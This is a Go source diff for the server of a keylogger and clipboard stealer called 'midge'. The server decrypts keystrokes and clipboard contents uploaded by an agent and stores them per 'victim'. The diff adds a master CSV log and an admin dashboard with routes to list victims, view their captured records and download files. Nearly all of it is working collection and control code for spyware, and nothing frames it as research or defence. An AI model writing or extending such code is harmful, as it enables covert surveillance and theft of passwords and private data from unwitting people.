@@ -32,24 +32,18 @@ import (
 	"golang.org/x/crypto/nacl/box"
 )
 
-func generateMidgeID() (string, error) {
-	idBytes := make([]byte, 16)
-	_, err := rand.Read(idBytes)
-	if err != nil {
-		return "", err
-	}
-	return hex.EncodeToString(idBytes), nil
+// Admin Structures
+type VictimRecord struct {
+	RecordID   string
+	ReceivedAt string
+	Clipboard  string
+	Keystrokes string
+	Filename   string
 }
 
-func createMidgeFile(id string) error {
-	filename := fmt.Sprintf("midges/midge_%s.txt", id)
-	f, err := os.Create(filename)
-	if err != nil {
-		return err
-	}
-	defer f.Close()
-
-	return nil
+type VictimPageData struct {
+	VictimID string
+	Records  []VictimRecord
 }
 
 func storeData(filename string, data []byte) error {
@@ -64,6 +58,198 @@ func storeData(filename string, data []byte) error {
 	}
 
 	return nil
+}
+
+func logCSV(id, timestamp, clipboard, keystrokes string) {
+	// Create/Append to master CSV
+	csvFile := filepath.Join("midges", "master_log.csv")
+	f, err := os.OpenFile(csvFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
+		fmt.Println("CSV Error:", err)
+		return
+	}
+	defer f.Close()
+
+	// Add header if new file
+	info, _ := f.Stat()
+	if info.Size() == 0 {
+		f.WriteString("VictimID,Timestamp,DataType,Content\n")
+	}
+
+	// Sanitize CSV fields (simple quote escape)
+	sanitize := func(s string) string {
+		return fmt.Sprintf("\"%s\"", strings.ReplaceAll(s, "\"", "\"\""))
+	}
+
+	if len(clipboard) > 0 {
+		line := fmt.Sprintf("%s,%s,Clipboard,%s\n", sanitize(id), sanitize(timestamp), sanitize(clipboard))
+		f.WriteString(line)
+	}
+	if len(keystrokes) > 0 {
+		line := fmt.Sprintf("%s,%s,Keystrokes,%s\n", sanitize(id), sanitize(timestamp), sanitize(keystrokes))
+		f.WriteString(line)
+	}
+}
+
+func parseMidgeFile(filepath string) (VictimRecord, error) {
+	content, err := os.ReadFile(filepath)
+	if err != nil {
+		return VictimRecord{}, err
+	}
+	text := string(content)
+
+	// Simple specific parsing based on processLogData format
+	// === Record Received at TIMESTAMP ===
+	// [Clipboard Data]
+	// ...
+	// [Keystrokes]
+	// ...
+	// ===============================
+
+	record := VictimRecord{Filename: filepath}
+
+	lines := strings.Split(text, "\n")
+	var clipboardBuilder, keystrokeBuilder strings.Builder
+	section := 0 // 0: header, 1: clipboard, 2: keystrokes
+
+	for _, line := range lines {
+		if strings.HasPrefix(line, "=== Record Received at") {
+			parts := strings.Split(line, "at ")
+			if len(parts) > 1 {
+				record.ReceivedAt = strings.TrimSuffix(parts[1], " ===")
+			}
+			continue
+		}
+		if line == "[Clipboard Data]" {
+			section = 1
+			continue
+		}
+		if line == "[Keystrokes]" {
+			section = 2
+			continue
+		}
+		if strings.HasPrefix(line, "======") {
+			continue
+		}
+
+		if section == 1 {
+			clipboardBuilder.WriteString(line + "\n")
+		} else if section == 2 {
+			keystrokeBuilder.WriteString(line + "\n")
+		}
+	}
+
+	record.Clipboard = strings.TrimSpace(clipboardBuilder.String())
+	record.Keystrokes = strings.TrimSpace(keystrokeBuilder.String())
+
+	// Fallback/Clean up empty markers
+	if record.Clipboard == "(Empty)" {
+		record.Clipboard = ""
+	}
+	if record.Keystrokes == "(Empty)" {
+		record.Keystrokes = ""
+	}
+
+	return record, nil
+}
+
+// Admin Handlers
+func adminDashboardHandler(w http.ResponseWriter, r *http.Request) {
+	midgeDir := "midges"
+	files, err := os.ReadDir(midgeDir)
+	if err != nil {
+		http.Error(w, "Could not read logs", http.StatusInternalServerError)
+		return
+	}
+
+	victims := make(map[string]bool)
+	for _, file := range files {
+		if file.IsDir() {
+			continue
+		}
+		name := file.Name()
+		// Format: User_Timestamp_midge.txt
+		if strings.HasSuffix(name, "_midge.txt") {
+			base := strings.TrimSuffix(name, "_midge.txt")
+			// Find the last underscore which separates user from timestamp
+			lastUnderscore := strings.LastIndex(base, "_")
+			if lastUnderscore != -1 {
+				userID := base[:lastUnderscore]
+				victims[userID] = true
+			}
+		}
+	}
+
+	var victimList []string
+	for v := range victims {
+		victimList = append(victimList, v)
+	}
+
+	tmpl, err := template.ParseFiles("templates/admin_dashboard.html")
+	if err != nil {
+		http.Error(w, "Template error: "+err.Error(), http.StatusInternalServerError)
+		return
+	}
+	tmpl.Execute(w, victimList)
+}
+
+func victimViewHandler(w http.ResponseWriter, r *http.Request) {
+	victimID := r.URL.Query().Get("id")
+	if victimID == "" {
+		http.Redirect(w, r, "/admin", http.StatusSeeOther)
+		return
+	}
+
+	midgeDir := "midges"
+	files, err := os.ReadDir(midgeDir)
+	if err != nil {
+		http.Error(w, "Could not read logs", http.StatusInternalServerError)
+		return
+	}
+
+	var records []VictimRecord
+
+	for _, file := range files {
+		name := file.Name()
+		// Check if file belongs to this victim
+		// Expected: victimID_timestamp_midge.txt
+		if strings.HasPrefix(name, victimID+"_") && strings.HasSuffix(name, "_midge.txt") {
+			fp := filepath.Join(midgeDir, name)
+			rec, err := parseMidgeFile(fp)
+			if err == nil {
+				// Extract timestamp part for ID
+				base := strings.TrimSuffix(name, "_midge.txt")
+				parts := strings.Split(base, "_")
+				if len(parts) > 0 {
+					rec.RecordID = parts[len(parts)-1]
+				}
+				records = append(records, rec)
+			}
+		}
+	}
+
+	data := VictimPageData{
+		VictimID: victimID,
+		Records:  records,
+	}
+
+	tmpl, err := template.ParseFiles("templates/victim_view.html")
+	if err != nil {
+		http.Error(w, "Template error: "+err.Error(), http.StatusInternalServerError)
+		return
+	}
+	tmpl.Execute(w, data)
+}
+
+func downloadFileHandler(w http.ResponseWriter, r *http.Request) {
+	filename := r.URL.Query().Get("file")
+	// basic path traversal prevention
+	if strings.Contains(filename, "..") || !strings.HasPrefix(filename, "midges") {
+		http.Error(w, "Invalid file", http.StatusBadRequest)
+		return
+	}
+	http.ServeFile(w, r, filename)
+
 }
 
 func decryptData(encryptedData []byte, nonce [24]byte, privateKey *[32]byte, publicKey *[32]byte) ([]byte, error) {
@@ -108,7 +294,7 @@ func processLogData(clipboard, keystrokes string) string {
 		sb.WriteString("[Keystrokes] (Empty)\n")
 	}
 
-	sb.WriteString(fmt.Sprintf("===============================\n\n"))
+	fmt.Fprintf(&sb, "===============================\n\n")
 	return sb.String()
 }
 
@@ -268,9 +454,14 @@ func main() {
 			os.Mkdir(midgeDir, 0755)
 		}
 
-		filename := filepath.Join(midgeDir, fmt.Sprintf("midge_%s.txt", id))
+		// Save as userID_timestamp_midge.txt
+		// id comes as USERNAME_TIMESTAMP from agent
+		filename := filepath.Join(midgeDir, fmt.Sprintf("%s_midge.txt", id))
 
 		logEntry := processLogData(string(plainClipboard), string(plainKeystrokes))
+
+		// Log to CSV as well
+		logCSV(id, time.Now().Format("2006-01-02 15:04:05"), string(plainClipboard), string(plainKeystrokes))
 
 		if err := storeData(filename, []byte(logEntry)); err != nil {
 			fmt.Printf("Error storing data for ID %s: %v\n", id, err)
@@ -283,6 +474,18 @@ func main() {
 		}
 		json.NewEncoder(w).Encode(response)
 	})
+
+	midgeDir := "midges"
+	if _, err := os.Stat(midgeDir); os.IsNotExist(err) {
+		os.Mkdir(midgeDir, 0755)
+	}
+	absMidgeDir, _ := filepath.Abs(midgeDir)
+	fmt.Printf("Midge storage directory: %s\n", absMidgeDir)
+
+	// Admin Dashboard Routes
+	http.HandleFunc("/admin", adminDashboardHandler)
+	http.HandleFunc("/admin/victim", victimViewHandler)
+	http.HandleFunc("/admin/download", downloadFileHandler)
 
 	// Key Exchange Route
 	http.HandleFunc("/key-exchange", func(w http.ResponseWriter, r *http.Request) {
